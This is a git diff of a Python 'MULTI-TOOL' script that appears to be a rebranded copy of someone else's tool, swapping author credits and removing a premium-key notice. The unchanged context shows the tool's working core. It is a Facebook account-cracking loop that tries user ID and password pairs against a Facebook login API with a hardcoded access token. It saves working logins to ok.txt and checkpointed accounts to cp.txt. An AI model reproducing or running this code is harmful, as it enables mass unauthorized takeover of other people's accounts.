@@ -6,7 +6,7 @@
 import os
 import time
 os.system("clear")
-print("  ==> \033[1;32mTHIS TOOLS DECODE BY (DEVIL) ")
+print("  ==> \033[1;32mTHIS TOOLS DECODE BY (Sagar) ")
 time.sleep(5)
 
 W = '\033[97;1m' 
@@ -56,15 +56,6 @@ def helpnote():
 	exit(" [*] WHAT'S APP : https://whatsapp.com/dl/ ")
 
 
-def notice():
-
-
-	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")
-	runtxt("\033[0;93m SEND THIS KEY TO ADMIN FOR \033[0;96m FREE APPROVAL>> %s%s"%(G,basesplit))
-	runtxt("\033[0;92m ADMIN WHAT'S APP >> https://whatsapp.com/dl/")
-	runtxt("\033[0;95m    <===================☠️  \033[0;97mEXIT\033[0;95m ☠️===================> ")
-	subprocess.check_output(["am", "start", "https://whatsapp.com/dl/"])
-
 
         
 plist = (platform.uname())[2]
@@ -95,13 +86,13 @@ class Main:
 				stat = ("\033[0;91mFREE USER")
 				FY = '\033[0;90m'
 				FG = '\033[0;90m'
-				GET = '\033[0;92m [P] GET PREMIUM'
+			
 		except requests.exceptions.ConnectionError:
 			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
 			exit()
 		os.system("clear")
 		
-		print("\n"+C+"  _____  ________      _______ _  \n |  __ \|  ____\ \    / /_   _| |      "+Y+"|I'M"+C+"\n | |  | | |__   \ \  / /  | | | |     "+Y+"|𝐃𝐞𝐯𝐢𝐥"+C+"\n | |  | |  __|   \ \/ /   | | | |     "+Y+"|𝐍𝐀𝐉𝐌𝐔𝐋"+C+"\n | |__| | |____   \  /   _| |_| |____ \n |_____/|______|   \/   |_____|______|\n "+N+"──────────────────────────────────────────────────"+G+"\n▸ AUTHOR     : Sagar Rajbanshi\n▸ FACEBOOK   : FACEBOOK.COM/SagarRajbanshiofficial.profile\n▸ PAGE    : SagarRajbanshiOfficial.page\n▸ GITHUB     : GITHUB.COM/SagarRajbanshi\n"+N+"─────────────────────────────────────────────────\n")
+		print("\n"+C+"  _____  ________      _______ _  \n |  __ \|  ____\ \    / /_   _| |      "+Y+"|I'M"+C+"\n | |  | | |__   \ \  / /  | | | |     "+Y+"|Mr.X"+C+"\n | |  | |  __|   \ \/ /   | | | |     "+Y+"|SagarRajbanshi"+C+"\n | |__| | |____   \  /   _| |_| |____ \n |_____/|______|   \/   |_____|______|\n "+N+"──────────────────────────────────────────────────"+G+"\n▸ AUTHOR     : Sagar Rajbanshi\n▸ FACEBOOK   : SagarRajbanshi\n▸ PAGE      : SagarRajbanshi\n▸ GITHUB     : GITHUB.COM/SagarRajbanshi\n"+N+"─────────────────────────────────────────────────\n")
 		print("%s [%s•%s] %sTOOL NAME : %sMULTI-TOOL"%(G,R,G,B,G))
 		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
 		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
@@ -229,12 +220,12 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r  \033[0;92m   [𝐃𝐞𝐯𝐢𝐥-OK😽] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;92m   [SagarRajbanshi-OK😽] %s | %s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;91m   [𝐃𝐞𝐯𝐢𝐥-CP😿] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;91m   [Error-CP😿] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
